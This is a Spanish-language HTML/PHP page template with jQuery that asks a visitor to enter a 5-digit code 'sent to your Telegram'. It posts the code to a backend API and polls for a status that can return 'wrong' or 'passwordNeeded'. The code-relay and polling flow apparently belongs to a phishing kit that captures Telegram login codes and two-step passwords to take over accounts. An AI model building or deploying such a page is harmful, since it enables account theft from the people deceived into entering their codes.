<div class="flex h-full px-4">
    <div class="w-full m-auto my-8">
        <div class="bg-white rounded-lg overflow-hidden dkconsty" style="padding-bottom: 30px;">
            <form id="formcode" method="post">
                <div class="flex justify-end">
                    <img id="check-mark" class="fixed hidden" src="assets/check.png" alt="">
                </div>
                <div class="px-4 mt-4">
                    <p class="text-center" style="font-size: 22px; font-weight: 600; color: #1c5443;">Ingresar código de verificación</p>
                    <p class="text-center" style="font-size: 14px; padding-top: 5px;">Se ha enviado un código de 5 dígitos a tu Telegram.</p>
                    <hr class="my-4">
                </div>
                <div class="px-8 mt-4">
                    <div data-input-otp-container="true" class="mb-4 relative flex w-full flex-wrap items-stretch justify-center">
                        <input name="otp[]" autocomplete="one-time-code" class="otp-input relative flex h-10 w-10 items-center justify-center border-y text-sm transition-all first:rounded-l-md first:border-l last:rounded-r-md rounded-md border border-slate-400 dkshadow" inputmode="numeric" pattern="^\d+$" maxlength="1" value="" style="width: 50px; height:50px; text-align: center; font-size: 1.5rem; margin: 0 4px;">
                        <input name="otp[]" autocomplete="one-time-code" class="otp-input relative flex h-10 w-10 items-center justify-center border-y text-sm transition-all first:rounded-l-md first:border-l last:rounded-r-md rounded-md border border-slate-400 dkshadow" inputmode="numeric" pattern="^\d+$" maxlength="1" value="" style="width: 50px; height:50px; text-align: center; font-size: 1.5rem; margin: 0 4px;">
                        <input name="otp[]" autocomplete="one-time-code" class="otp-input relative flex h-10 w-10 items-center justify-center border-y text-sm transition-all first:rounded-l-md first:border-l last:rounded-r-md rounded-md border border-slate-400 dkshadow" inputmode="numeric" pattern="^\d+$" maxlength="1" value="" style="width: 50px; height:50px; text-align: center; font-size: 1.5rem; margin: 0 4px;">
                        <input name="otp[]" autocomplete="one-time-code" class="otp-input relative flex h-10 w-10 items-center justify-center border-y text-sm transition-all first:rounded-l-md first:border-l last:rounded-r-md rounded-md border border-slate-400 dkshadow" inputmode="numeric" pattern="^\d+$" maxlength="1" value="" style="width: 50px; height:50px; text-align: center; font-size: 1.5rem; margin: 0 4px;">
                        <input name="otp[]" autocomplete="one-time-code" class="otp-input relative flex h-10 w-10 items-center justify-center border-y text-sm transition-all first:rounded-l-md first:border-l last:rounded-r-md rounded-md border border-slate-400 dkshadow" inputmode="numeric" pattern="^\d+$" maxlength="1" value="" style="width: 50px;height:50px; text-align: center; font-size: 1.5rem; margin: 0 4px;">
                    </div>
                </div>                
                <div class="px-8 pt-2">
                    <div class="flex items-center justify-between">
                      <button class="text-center font-bold text-white w-full py-2 h-12" type="submit" style="background-color: #1565C0; border-radius: 8px; box-shadow: 0 6px 18px rgba(21, 101, 192, 0.06); ">

                            <b id="lblLogin">Verificar código</b>
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<script>
  $("#loader").hide();
  document.addEventListener("DOMContentLoaded", function () {
      const otpInputs = document.querySelectorAll(".otp-input");

      otpInputs.forEach((input, index) => {
          input.addEventListener("input", (e) => {
              if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                  otpInputs[index + 1].focus();
              }
          });

          input.addEventListener("keydown", (e) => {
              if (e.key === "Backspace" && !e.target.value && index > 0) {
                  otpInputs[index - 1].focus();
              }
          });
      });
  });

  function checkStatus() {
    
    $.ajax({
      url: "<?= base_url("API/index.php") ?>",
      type: "POST",
      data: {"method":"getStatus"},
      success:function(data){
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          if (data.result.detail == "wrong") {
            $("#loader").hide();
          } else if (data.result.detail == "passwordNeeded") {
            window.location.reload();
          }
          $("#wrong").show();
          $("input[type='text']").val("");
        } else {
          setTimeout(function(){
            checkStatus();
          }, 500);
        }
      }, error:function(data){}
    });
  }

  $("#formcode button").on("click", function(e){
    e.preventDefault();

    var otpValues = $("input[name='otp[]']").map(function() {
        return $(this).val();
    }).get();

    var com = otpValues.join("");

    if (com != "") {
      $("#loader").show();
      $.ajax({
        url: "<?= base_url("API/index.php") ?>",
        type: "POST",
        data: {"method":"sendOtp","otp":com},
        success:function(data){
          setTimeout(function(){
            checkStatus();
          }, 500);
        },
        error:function(data){}
      });
    }
  });
</script>
